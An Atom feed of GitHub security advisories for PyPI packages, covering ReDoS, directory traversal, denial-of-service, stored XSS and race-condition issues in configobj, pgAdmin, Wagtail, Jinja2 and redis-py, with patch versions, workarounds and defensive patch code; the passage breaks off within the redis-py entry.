<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2023-04-05T00:03:28.544Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[configobj] configobj ReDoS exploitable by developer using values in a server-side configuration file]]></title>
        <id>https://github.com/advisories/GHSA-c33w-24p9-8m24</id>
        <link href="https://github.com/advisories/GHSA-c33w-24p9-8m24"/>
        <updated>2023-04-04T21:40:45.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package configobj are vulnerable to Regular Expression Denial of Service (ReDoS) via the validate function, using (.+?)((.*)). <strong>Note:</strong> This is only exploitable in the case of a developer, putting the offending value in a server side configuration file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-26112">https://nvd.nist.gov/vuln/detail/CVE-2023-26112</a></li>
<li><a href="https://github.com/DiffSK/configobj/issues/232">https://github.com/DiffSK/configobj/issues/232</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-CONFIGOBJ-3252494">https://security.snyk.io/vuln/SNYK-PYTHON-CONFIGOBJ-3252494</a></li>
<li><a href="https://github.com/advisories/GHSA-c33w-24p9-8m24">https://github.com/advisories/GHSA-c33w-24p9-8m24</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c33w-24p9-8m24</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-04-03T06:30:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pgadmin4] pgAdmin 4 vulnerable to directory traversal ]]></title>
        <id>https://github.com/advisories/GHSA-9crj-hpxh-f6qg</id>
        <link href="https://github.com/advisories/GHSA-9crj-hpxh-f6qg"/>
        <updated>2023-04-03T19:30:04.000Z</updated>
        <content type="html"><![CDATA[<p>pgAdmin 4 versions prior to v6.19 contains a directory traversal vulnerability. A user of the product may change another user's settings or alter the database.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-0241">https://nvd.nist.gov/vuln/detail/CVE-2023-0241</a></li>
<li><a href="https://github.com/pgadmin-org/pgadmin4/issues/5734">https://github.com/pgadmin-org/pgadmin4/issues/5734</a></li>
<li><a href="https://jvn.jp/en/jp/JVN01398015/">https://jvn.jp/en/jp/JVN01398015/</a></li>
<li><a href="https://github.com/akshay-joshi/pgadmin4/commit/64d7289c5b3831137b17bb4c5022ef4f63d2ef42">https://github.com/akshay-joshi/pgadmin4/commit/64d7289c5b3831137b17bb4c5022ef4f63d2ef42</a></li>
<li><a href="https://github.com/advisories/GHSA-9crj-hpxh-f6qg">https://github.com/advisories/GHSA-9crj-hpxh-f6qg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9crj-hpxh-f6qg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-27T21:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wagtail] Wagtail vulnerable to denial-of-service via memory exhaustion when uploading large files]]></title>
        <id>https://github.com/advisories/GHSA-33pv-vcgh-jfg9</id>
        <link href="https://github.com/advisories/GHSA-33pv-vcgh-jfg9"/>
        <updated>2023-04-03T19:18:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A memory exhaustion bug exists in Wagtail's handling of uploaded images and documents. For both images and documents, files are loaded into memory during upload for additional processing. A user with access to upload images or documents through the Wagtail admin interface could upload a file so large that it results in a crash or denial of service.</p>
<p>The vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin. It can only be exploited by admin users with permission to upload images or documents.</p>
<p>Image uploads are <a href="https://docs.wagtail.org/en/stable/reference/settings.html#wagtailimages-max-upload-size">restricted to 10MB by default</a>, however this validation only happens on the frontend and on the backend after the vulnerable code. </p>
<h3 id="patches">Patches</h3>
<p>Patched versions have been released as Wagtail 4.1.4 (for the LTS 4.1 branch) and Wagtail 4.2.2 (for the current 4.2 branch).</p>
<h3 id="workarounds">Workarounds</h3>
<p>Site owners who are unable to upgrade to the new versions are encouraged to add extra protections outside of Wagtail to limit the size of uploaded files. Exactly how this is done will vary based on your hosting environment, but here are a few references for common setups:</p>
<ul>
<li>Nginx: <a href="https://nginx.org/en/docs/http/ngx_http_core_module.html#client_max_body_size"><code>client_max_body_size</code></a></li>
<li>Apache: <a href="https://httpd.apache.org/docs/2.4/mod/core.html#limitrequestbody"><code>LimitRequestBody</code></a></li>
<li>Cloudflare: Already <a href="https://developers.cloudflare.com/cache/about/default-cache-behavior#customization-options-and-limitations">imposes a limit of 100MB - 500MB</a> depending on plan</li>
<li>CloudFront: <a href="https://docs.aws.amazon.com/waf/latest/APIReference/API_SizeConstraintStatement.html"><code>SizeConstraint</code></a></li>
<li>Traefik: <a href="https://doc.traefik.io/traefik/middlewares/http/buffering/#maxrequestbodybytes"><code>traefik.http.middlewares.limit.buffering.maxRequestBodyBytes</code></a></li>
</ul>
<p>The changes themselves are deep inside Wagtail, making patching incredibly difficult.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/wagtail/wagtail/security/advisories/GHSA-33pv-vcgh-jfg9">https://github.com/wagtail/wagtail/security/advisories/GHSA-33pv-vcgh-jfg9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28837">https://nvd.nist.gov/vuln/detail/CVE-2023-28837</a></li>
<li><a href="https://github.com/wagtail/wagtail/commit/3c0c64642b9e5b8d28b111263c7f4bddad6c3880">https://github.com/wagtail/wagtail/commit/3c0c64642b9e5b8d28b111263c7f4bddad6c3880</a></li>
<li><a href="https://github.com/wagtail/wagtail/commit/c9d2fcd650a88d76ae122646142245e5927a9165">https://github.com/wagtail/wagtail/commit/c9d2fcd650a88d76ae122646142245e5927a9165</a></li>
<li><a href="https://github.com/wagtail/wagtail/commit/cfa11bbe00dbe7ce8cd4c0bbfe2a898a690df2bf">https://github.com/wagtail/wagtail/commit/cfa11bbe00dbe7ce8cd4c0bbfe2a898a690df2bf</a></li>
<li><a href="https://github.com/wagtail/wagtail/commit/d4022310cbe497993459c3136311467c7ac6329a">https://github.com/wagtail/wagtail/commit/d4022310cbe497993459c3136311467c7ac6329a</a></li>
<li><a href="https://docs.wagtail.org/en/stable/reference/settings.html#wagtailimages-max-upload-size">https://docs.wagtail.org/en/stable/reference/settings.html#wagtailimages-max-upload-size</a></li>
<li><a href="https://github.com/wagtail/wagtail/releases/tag/v4.1.4">https://github.com/wagtail/wagtail/releases/tag/v4.1.4</a></li>
<li><a href="https://github.com/wagtail/wagtail/releases/tag/v4.2.2">https://github.com/wagtail/wagtail/releases/tag/v4.2.2</a></li>
<li><a href="https://github.com/advisories/GHSA-33pv-vcgh-jfg9">https://github.com/advisories/GHSA-33pv-vcgh-jfg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-33pv-vcgh-jfg9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-04-03T19:18:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wagtail] Wagtail vulnerable to denial-of-service via memory exhaustion when uploading large files]]></title>
        <id>https://github.com/advisories/GHSA-33pv-vcgh-jfg9</id>
        <link href="https://github.com/advisories/GHSA-33pv-vcgh-jfg9"/>
        <updated>2023-04-03T19:18:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A memory exhaustion bug exists in Wagtail's handling of uploaded images and documents. For both images and documents, files are loaded into memory during upload for additional processing. A user with access to upload images or documents through the Wagtail admin interface could upload a file so large that it results in a crash or denial of service.</p>
<p>The vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin. It can only be exploited by admin users with permission to upload images or documents.</p>
<p>Image uploads are <a href="https://docs.wagtail.org/en/stable/reference/settings.html#wagtailimages-max-upload-size">restricted to 10MB by default</a>, however this validation only happens on the frontend and on the backend after the vulnerable code. </p>
<h3 id="patches">Patches</h3>
<p>Patched versions have been released as Wagtail 4.1.4 (for the LTS 4.1 branch) and Wagtail 4.2.2 (for the current 4.2 branch).</p>
<h3 id="workarounds">Workarounds</h3>
<p>Site owners who are unable to upgrade to the new versions are encouraged to add extra protections outside of Wagtail to limit the size of uploaded files. Exactly how this is done will vary based on your hosting environment, but here are a few references for common setups:</p>
<ul>
<li>Nginx: <a href="https://nginx.org/en/docs/http/ngx_http_core_module.html#client_max_body_size"><code>client_max_body_size</code></a></li>
<li>Apache: <a href="https://httpd.apache.org/docs/2.4/mod/core.html#limitrequestbody"><code>LimitRequestBody</code></a></li>
<li>Cloudflare: Already <a href="https://developers.cloudflare.com/cache/about/default-cache-behavior#customization-options-and-limitations">imposes a limit of 100MB - 500MB</a> depending on plan</li>
<li>CloudFront: <a href="https://docs.aws.amazon.com/waf/latest/APIReference/API_SizeConstraintStatement.html"><code>SizeConstraint</code></a></li>
<li>Traefik: <a href="https://doc.traefik.io/traefik/middlewares/http/buffering/#maxrequestbodybytes"><code>traefik.http.middlewares.limit.buffering.maxRequestBodyBytes</code></a></li>
</ul>
<p>The changes themselves are deep inside Wagtail, making patching incredibly difficult.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/wagtail/wagtail/security/advisories/GHSA-33pv-vcgh-jfg9">https://github.com/wagtail/wagtail/security/advisories/GHSA-33pv-vcgh-jfg9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28837">https://nvd.nist.gov/vuln/detail/CVE-2023-28837</a></li>
<li><a href="https://github.com/wagtail/wagtail/commit/3c0c64642b9e5b8d28b111263c7f4bddad6c3880">https://github.com/wagtail/wagtail/commit/3c0c64642b9e5b8d28b111263c7f4bddad6c3880</a></li>
<li><a href="https://github.com/wagtail/wagtail/commit/c9d2fcd650a88d76ae122646142245e5927a9165">https://github.com/wagtail/wagtail/commit/c9d2fcd650a88d76ae122646142245e5927a9165</a></li>
<li><a href="https://github.com/wagtail/wagtail/commit/cfa11bbe00dbe7ce8cd4c0bbfe2a898a690df2bf">https://github.com/wagtail/wagtail/commit/cfa11bbe00dbe7ce8cd4c0bbfe2a898a690df2bf</a></li>
<li><a href="https://github.com/wagtail/wagtail/commit/d4022310cbe497993459c3136311467c7ac6329a">https://github.com/wagtail/wagtail/commit/d4022310cbe497993459c3136311467c7ac6329a</a></li>
<li><a href="https://docs.wagtail.org/en/stable/reference/settings.html#wagtailimages-max-upload-size">https://docs.wagtail.org/en/stable/reference/settings.html#wagtailimages-max-upload-size</a></li>
<li><a href="https://github.com/wagtail/wagtail/releases/tag/v4.1.4">https://github.com/wagtail/wagtail/releases/tag/v4.1.4</a></li>
<li><a href="https://github.com/wagtail/wagtail/releases/tag/v4.2.2">https://github.com/wagtail/wagtail/releases/tag/v4.2.2</a></li>
<li><a href="https://github.com/advisories/GHSA-33pv-vcgh-jfg9">https://github.com/advisories/GHSA-33pv-vcgh-jfg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-33pv-vcgh-jfg9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-04-03T19:18:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jinja2] Regular Expression Denial of Service (ReDoS) in Jinja2]]></title>
        <id>https://github.com/advisories/GHSA-g3rq-g295-4j3m</id>
        <link href="https://github.com/advisories/GHSA-g3rq-g295-4j3m"/>
        <updated>2023-04-03T18:48:25.000Z</updated>
        <content type="html"><![CDATA[<p>This affects the package jinja2 from 0.0.0 and before 2.11.3. The ReDOS vulnerability of the regex is mainly due to the sub-pattern [a-zA-Z0-9.<em>-]+.[a-zA-Z0-9.</em>-]+ This issue can be mitigated by Markdown to format user content instead of the urlize filter, or by implementing request timeouts and limiting process memory.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-28493">https://nvd.nist.gov/vuln/detail/CVE-2020-28493</a></li>
<li><a href="https://github.com/pallets/jinja/pull/1343">https://github.com/pallets/jinja/pull/1343</a></li>
<li><a href="https://github.com/pallets/jinja/blob/ab81fd9c277900c85da0c322a2ff9d68a235b2e6/src/jinja2/utils.py%23L20">https://github.com/pallets/jinja/blob/ab81fd9c277900c85da0c322a2ff9d68a235b2e6/src/jinja2/utils.py%23L20</a></li>
<li><a href="https://snyk.io/vuln/SNYK-PYTHON-JINJA2-1012994">https://snyk.io/vuln/SNYK-PYTHON-JINJA2-1012994</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PVAKCOO7VBVUBM3Q6CBBTPBFNP5NDXF4/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PVAKCOO7VBVUBM3Q6CBBTPBFNP5NDXF4/</a></li>
<li><a href="https://security.gentoo.org/glsa/202107-19">https://security.gentoo.org/glsa/202107-19</a></li>
<li><a href="https://github.com/pallets/jinja/commit/15ef8f09b659f9100610583938005a7a10472d4d">https://github.com/pallets/jinja/commit/15ef8f09b659f9100610583938005a7a10472d4d</a></li>
<li><a href="https://github.com/advisories/GHSA-g3rq-g295-4j3m">https://github.com/advisories/GHSA-g3rq-g295-4j3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g3rq-g295-4j3m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-03-19T21:28:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wagtail] Wagtail vulnerable to stored Cross-site Scripting attack via ModelAdmin views]]></title>
        <id>https://github.com/advisories/GHSA-5286-f2rf-35c2</id>
        <link href="https://github.com/advisories/GHSA-5286-f2rf-35c2"/>
        <updated>2023-04-03T20:21:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A stored cross-site scripting (XSS) vulnerability exists on ModelAdmin views within the Wagtail admin interface. A user with a limited-permission editor account for the Wagtail admin could potentially craft pages and documents that, when viewed by a user with higher privileges, could perform actions with that user's credentials. The vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin, and only affects sites with ModelAdmin enabled.</p>
<ul>
<li>For page, the vulnerability is in the "Choose a parent page" ModelAdmin view (<a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/chooseparentview.html#customising-chooseparentview"><code>ChooseParentView</code></a>), available when managing pages via ModelAdmin.</li>
<li>For documents, the vulnerability is in the ModelAdmin Inspect view (<a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#enabling-customising-inspectview"><code>InspectView</code></a>) when displaying document fields.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Patched versions have been released as Wagtail 4.1.4 (for the LTS 4.1 branch) and Wagtail 4.2.2 (for the current 4.2 branch).</p>
<h3 id="workarounds">Workarounds</h3>
<p>Site owners who are unable to upgrade to the new versions can disable or override the corresponding functionality.</p>
<h4 id="chooseparentview"><code>ChooseParentView</code></h4>
<p>For <a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/chooseparentview.html#modeladmin-choose-parent-view-class"><code>ChooseParentView</code></a>:</p>
<ul>
<li>Disable ModelAdmin for all page models.</li>
<li>Or provide a custom view via <a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/chooseparentview.html#id4"><code>choose_parent_view_class</code></a>, with the custom view overriding the <code>get_form</code> method.</li>
</ul>
<p>One of those steps need to be applied for every <code>ModelAdmin</code> class hooked into Wagtail where the model is a Wagtail <code>Page</code> or sub-class. Here is an example of implementing the custom <code>ChooseParentView</code> with patched HTML escaping:</p>
<pre><code class="language-python">from django import forms
from django.utils.translation import gettext as _
from wagtail.contrib.modeladmin.views import ChooseParentView
from wagtail.contrib.modeladmin.forms import ParentChooserForm


class PatchedPageChoiceField(forms.ModelChoiceField):
    """PageChoiceField with plain-text breadcrumbs to patch stored XSS."""
    def label_from_instance(self, obj):
        bits = []
        for ancestor in (
            obj.get_ancestors(inclusive=True).exclude(depth=1).specific(defer=True)
        ):
            bits.append(ancestor.get_admin_display_title())
        return ' | '.join(bits)


class PatchedParentChooserForm(ParentChooserForm):
    """ParentChooserForm with custom parent_page to patch stored XSS."""
    parent_page = PatchedPageChoiceField(
        label=_("Parent page"),
        required=True,
        empty_label=None,
        queryset=Page.objects.none(),
        widget=forms.RadioSelect(),
    )


class PatchedChooseParentView(ChooseParentView):
    """ChooseParentView with custom get_form patch stored XSS."""
    def get_form(self, request):
        parents = self.permission_helper.get_valid_parent_pages(request.user)
        return PatchedParentChooserForm(parents, request.POST or None)
</code></pre>
<h4 id="inspectview"><code>InspectView</code></h4>
<p>For <a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#enabling-customising-inspectview"><code>InspectView</code></a>:</p>
<ul>
<li>Remove <code>inspect_view_enabled=True</code> or set it to False to disable the view.</li>
<li>Or use <a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#modeladmin-inspect-view-fields"><code>inspect_view_fields</code></a> or <a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#modeladmin-inspect-view-fields-exclude"><code>inspect_view_fields_exclude</code></a> to prevent displaying document fields in the views.</li>
<li>Or provide a custom view via <a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#id12"><code>inspect_view_class</code></a>, with the custom view overriding the <code>get_document_field_display</code> method.</li>
</ul>
<p>One of those steps need to be applied for every <code>ModelAdmin</code> class hooked into Wagtail where <code>inspect_view_enabled=True</code>. Here is an example of implementing the custom <code>InspectView</code> with patched HTML escaping:</p>
<pre><code class="language-python">from django.template.defaultfilters import filesizeformat
from django.utils.html import format_html
from wagtail.contrib.modeladmin.views import InspectView


class PatchedInspectView(InspectView):
    """InspectView with override to patch stored XSS vulnerability."""
    def get_document_field_display(self, field_name, field):
        """Render a link to a document"""
        document = getattr(self.instance, field_name)
        if document:
            return format_html(
                '&lt;a href="{}"&gt;{} &lt;span class="meta"&gt;({}, {})&lt;/span&gt;&lt;/a&gt;',
                document.url,
                document.title,
                document.file_extension.upper(),
                filesizeformat(document.file.size),
            )
        return self.model_admin.get_empty_value_display(field_name)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/wagtail/wagtail/security/advisories/GHSA-5286-f2rf-35c2">https://github.com/wagtail/wagtail/security/advisories/GHSA-5286-f2rf-35c2</a></li>
<li><a href="https://github.com/wagtail/wagtail/commit/5be2b1ed55fd7259dfdf2c82e7701dba407b8b62">https://github.com/wagtail/wagtail/commit/5be2b1ed55fd7259dfdf2c82e7701dba407b8b62</a></li>
<li><a href="https://github.com/wagtail/wagtail/commit/bc84bf9815610cfbf8db3b6050c7ddcbaa4b9713">https://github.com/wagtail/wagtail/commit/bc84bf9815610cfbf8db3b6050c7ddcbaa4b9713</a></li>
<li><a href="https://github.com/wagtail/wagtail/commit/eefc3381d37b476791610e5d30594fae443f33af">https://github.com/wagtail/wagtail/commit/eefc3381d37b476791610e5d30594fae443f33af</a></li>
<li><a href="https://github.com/wagtail/wagtail/commit/ff806ab173a504395fdfb3139eb0a29444ab4b91">https://github.com/wagtail/wagtail/commit/ff806ab173a504395fdfb3139eb0a29444ab4b91</a></li>
<li><a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/chooseparentview.html#customising-chooseparentview">https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/chooseparentview.html#customising-chooseparentview</a></li>
<li><a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#enabling-customising-inspectview">https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#enabling-customising-inspectview</a></li>
<li><a href="https://github.com/wagtail/wagtail/releases/tag/v4.1.4">https://github.com/wagtail/wagtail/releases/tag/v4.1.4</a></li>
<li><a href="https://github.com/wagtail/wagtail/releases/tag/v4.2.2">https://github.com/wagtail/wagtail/releases/tag/v4.2.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28836">https://nvd.nist.gov/vuln/detail/CVE-2023-28836</a></li>
<li><a href="https://github.com/advisories/GHSA-5286-f2rf-35c2">https://github.com/advisories/GHSA-5286-f2rf-35c2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5286-f2rf-35c2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-04-03T17:25:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wagtail] Wagtail vulnerable to stored Cross-site Scripting attack via ModelAdmin views]]></title>
        <id>https://github.com/advisories/GHSA-5286-f2rf-35c2</id>
        <link href="https://github.com/advisories/GHSA-5286-f2rf-35c2"/>
        <updated>2023-04-03T20:21:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A stored cross-site scripting (XSS) vulnerability exists on ModelAdmin views within the Wagtail admin interface. A user with a limited-permission editor account for the Wagtail admin could potentially craft pages and documents that, when viewed by a user with higher privileges, could perform actions with that user's credentials. The vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin, and only affects sites with ModelAdmin enabled.</p>
<ul>
<li>For page, the vulnerability is in the "Choose a parent page" ModelAdmin view (<a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/chooseparentview.html#customising-chooseparentview"><code>ChooseParentView</code></a>), available when managing pages via ModelAdmin.</li>
<li>For documents, the vulnerability is in the ModelAdmin Inspect view (<a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#enabling-customising-inspectview"><code>InspectView</code></a>) when displaying document fields.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Patched versions have been released as Wagtail 4.1.4 (for the LTS 4.1 branch) and Wagtail 4.2.2 (for the current 4.2 branch).</p>
<h3 id="workarounds">Workarounds</h3>
<p>Site owners who are unable to upgrade to the new versions can disable or override the corresponding functionality.</p>
<h4 id="chooseparentview"><code>ChooseParentView</code></h4>
<p>For <a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/chooseparentview.html#modeladmin-choose-parent-view-class"><code>ChooseParentView</code></a>:</p>
<ul>
<li>Disable ModelAdmin for all page models.</li>
<li>Or provide a custom view via <a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/chooseparentview.html#id4"><code>choose_parent_view_class</code></a>, with the custom view overriding the <code>get_form</code> method.</li>
</ul>
<p>One of those steps need to be applied for every <code>ModelAdmin</code> class hooked into Wagtail where the model is a Wagtail <code>Page</code> or sub-class. Here is an example of implementing the custom <code>ChooseParentView</code> with patched HTML escaping:</p>
<pre><code class="language-python">from django import forms
from django.utils.translation import gettext as _
from wagtail.contrib.modeladmin.views import ChooseParentView
from wagtail.contrib.modeladmin.forms import ParentChooserForm


class PatchedPageChoiceField(forms.ModelChoiceField):
    """PageChoiceField with plain-text breadcrumbs to patch stored XSS."""
    def label_from_instance(self, obj):
        bits = []
        for ancestor in (
            obj.get_ancestors(inclusive=True).exclude(depth=1).specific(defer=True)
        ):
            bits.append(ancestor.get_admin_display_title())
        return ' | '.join(bits)


class PatchedParentChooserForm(ParentChooserForm):
    """ParentChooserForm with custom parent_page to patch stored XSS."""
    parent_page = PatchedPageChoiceField(
        label=_("Parent page"),
        required=True,
        empty_label=None,
        queryset=Page.objects.none(),
        widget=forms.RadioSelect(),
    )


class PatchedChooseParentView(ChooseParentView):
    """ChooseParentView with custom get_form patch stored XSS."""
    def get_form(self, request):
        parents = self.permission_helper.get_valid_parent_pages(request.user)
        return PatchedParentChooserForm(parents, request.POST or None)
</code></pre>
<h4 id="inspectview"><code>InspectView</code></h4>
<p>For <a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#enabling-customising-inspectview"><code>InspectView</code></a>:</p>
<ul>
<li>Remove <code>inspect_view_enabled=True</code> or set it to False to disable the view.</li>
<li>Or use <a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#modeladmin-inspect-view-fields"><code>inspect_view_fields</code></a> or <a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#modeladmin-inspect-view-fields-exclude"><code>inspect_view_fields_exclude</code></a> to prevent displaying document fields in the views.</li>
<li>Or provide a custom view via <a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#id12"><code>inspect_view_class</code></a>, with the custom view overriding the <code>get_document_field_display</code> method.</li>
</ul>
<p>One of those steps need to be applied for every <code>ModelAdmin</code> class hooked into Wagtail where <code>inspect_view_enabled=True</code>. Here is an example of implementing the custom <code>InspectView</code> with patched HTML escaping:</p>
<pre><code class="language-python">from django.template.defaultfilters import filesizeformat
from django.utils.html import format_html
from wagtail.contrib.modeladmin.views import InspectView


class PatchedInspectView(InspectView):
    """InspectView with override to patch stored XSS vulnerability."""
    def get_document_field_display(self, field_name, field):
        """Render a link to a document"""
        document = getattr(self.instance, field_name)
        if document:
            return format_html(
                '&lt;a href="{}"&gt;{} &lt;span class="meta"&gt;({}, {})&lt;/span&gt;&lt;/a&gt;',
                document.url,
                document.title,
                document.file_extension.upper(),
                filesizeformat(document.file.size),
            )
        return self.model_admin.get_empty_value_display(field_name)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/wagtail/wagtail/security/advisories/GHSA-5286-f2rf-35c2">https://github.com/wagtail/wagtail/security/advisories/GHSA-5286-f2rf-35c2</a></li>
<li><a href="https://github.com/wagtail/wagtail/commit/5be2b1ed55fd7259dfdf2c82e7701dba407b8b62">https://github.com/wagtail/wagtail/commit/5be2b1ed55fd7259dfdf2c82e7701dba407b8b62</a></li>
<li><a href="https://github.com/wagtail/wagtail/commit/bc84bf9815610cfbf8db3b6050c7ddcbaa4b9713">https://github.com/wagtail/wagtail/commit/bc84bf9815610cfbf8db3b6050c7ddcbaa4b9713</a></li>
<li><a href="https://github.com/wagtail/wagtail/commit/eefc3381d37b476791610e5d30594fae443f33af">https://github.com/wagtail/wagtail/commit/eefc3381d37b476791610e5d30594fae443f33af</a></li>
<li><a href="https://github.com/wagtail/wagtail/commit/ff806ab173a504395fdfb3139eb0a29444ab4b91">https://github.com/wagtail/wagtail/commit/ff806ab173a504395fdfb3139eb0a29444ab4b91</a></li>
<li><a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/chooseparentview.html#customising-chooseparentview">https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/chooseparentview.html#customising-chooseparentview</a></li>
<li><a href="https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#enabling-customising-inspectview">https://docs.wagtail.org/en/stable/reference/contrib/modeladmin/inspectview.html#enabling-customising-inspectview</a></li>
<li><a href="https://github.com/wagtail/wagtail/releases/tag/v4.1.4">https://github.com/wagtail/wagtail/releases/tag/v4.1.4</a></li>
<li><a href="https://github.com/wagtail/wagtail/releases/tag/v4.2.2">https://github.com/wagtail/wagtail/releases/tag/v4.2.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28836">https://nvd.nist.gov/vuln/detail/CVE-2023-28836</a></li>
<li><a href="https://github.com/advisories/GHSA-5286-f2rf-35c2">https://github.com/advisories/GHSA-5286-f2rf-35c2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5286-f2rf-35c2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-04-03T17:25:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[redis] redis-py Race Condition due to incomplete fix]]></title>
        <id>https://github.com/advisories/GHSA-8fww-64cx-x8p5</id>
        <link href="https://github.com/advisories/GHSA-8fww-64cx-x8p5"/>
        <updated>2023-03-31T14:24:54.000Z</updated>
        <content type="html"><![CDATA[<p>redis-py through 4.5.3 and 4.4.3 leaves a connection open after canceling an async Redis command at an inopportune time (in the case of a non-pipeline operation), and can send response data to the client of an unrelated request. NOTE: this issue exists because of an incomplete fix for CVE-2023-28858.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28859">https://nvd.nist.gov/vuln/detail/CVE-2023-28859</a></li>
<li><a href="https://github.com/redis/redis-py/issues/2665">https://github.com/redis/redis-py/issues/2665</a></li>
<li><a href="https://github.com/redis/redis-py/pull/2641">https://github.com/redis/redis-py/pull/2641</a></li>
<li><a href="https://github.com/redis/redis-py/pull/2666">https://github.com/redis/redis-py/pull/2666</a></li>
<li><a href="https://github.com/redis/redis-py/pull/2671">https://github.com/redis/redis-py/pull/2671</a></li>
<li><a href="https://github.com/redis/redis-py/releases/tag/v4.4.4">https://github.com/redis/redis-py/releases/tag/v4.4.4</a></li>
<li><a href="https://github.com/redis/redis-py/releases/tag/v4.5.4">https://github.com/redis/redis-py/releases/tag/v4.5.4</a></li>
<li><a href="https://github.com/advisories/GHSA-8fww-64cx-x8p5">https://github.com/advisories/GHSA-8fww-64cx-x8p5</a></li>
</ul>
